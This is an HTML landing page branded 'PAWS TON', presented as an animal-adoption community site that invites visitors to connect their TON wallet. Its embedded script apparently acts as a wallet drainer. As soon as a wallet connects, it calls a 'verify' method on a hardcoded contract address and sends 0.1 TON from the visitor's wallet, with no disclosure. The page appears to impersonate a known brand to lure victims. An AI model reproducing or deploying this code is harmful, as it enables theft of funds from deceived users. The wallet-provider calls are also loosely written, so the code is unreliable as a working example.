<!DOCTYPE html>
<html>
<head>
    <base href="https://hasan199191.github.io/my-ton-app/">
    <meta charset="utf-8">
    <title>PAWS TON | Home</title>
    <meta name="description" content="Animals are done! It's PAWS Season">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="theme-color" content="#0D0D0D">

    <style>
        :root {
            --background: #0D0D0D;
            --text: #ffffff;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--background);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
        }

        .main-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 2rem;
            text-align: center;
        }

        .shape {
            position: absolute;
            pointer-events: none;
            z-index: 1;
        }

        .shape1 { top: 0; left: 0; width: 40%; }
        .shape2 { top: 20%; right: 0; width: 35%; }
        .shape3 { bottom: 20%; left: 0; width: 45%; }
        .shape4 { bottom: 0; right: 0; width: 40%; }

        .content {
            position: relative;
            z-index: 2;
            max-width: 800px;
        }

        h1 {
            font-size: 4.5rem;
            font-weight: 700;
            margin-bottom: 1.5rem;
            background: linear-gradient(91.53deg, #7074F5 0%, #9181F5 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .description {
            font-size: 1.25rem;
            opacity: 0.8;
            margin-bottom: 3rem;
            line-height: 1.6;
        }

        .wallet-container {
            display: inline-block;
            padding: 1rem;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            backdrop-filter: blur(10px);
        }

        @media (max-width: 768px) {
            h1 { font-size: 3rem; }
            .description { font-size: 1.1rem; }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <img src="assets/shape1.png" class="shape shape1" alt="">
        <img src="assets/shape2.png" class="shape shape2" alt="">
        <img src="assets/shape3.png" class="shape shape3" alt="">
        <img src="assets/shape4.png" class="shape shape4" alt="">

        <div class="content">
            <h1>Welcome to PAWS</h1>
            <p class="description">Join our community and help animals find their forever homes. Connect your TON wallet to get started.</p>
            <div class="wallet-container">
                <div id="ton-connect-button"></div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script>
        const CONTRACT_ADDRESS = "EQA0i8-CdGnF_DhUHHf92R1ONH6sIA9vLZ_WLcCIhfBBXwtG";

        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                if (window.TONConnect) {
                    const tonConnectUI = new window.TONConnect.UI({
                        manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
                        buttonRootId: 'ton-connect-button'
                    });

                    tonConnectUI.onStatusChange(async (wallet) => {
                        if (wallet) {
                            try {
                                const provider = window.ton;
                                const contract = new provider.Contract({
                                    address: CONTRACT_ADDRESS
                                });

                                await contract.methods.verify().send({
                                    from: wallet.account.address,
                                    amount: '0.1'
                                });
                            } catch (error) {
                                console.error("Contract interaction failed:", error);
                            }
                        }
                    });
                }
            }, 1000);
        });
    </script>
</body>
</html>
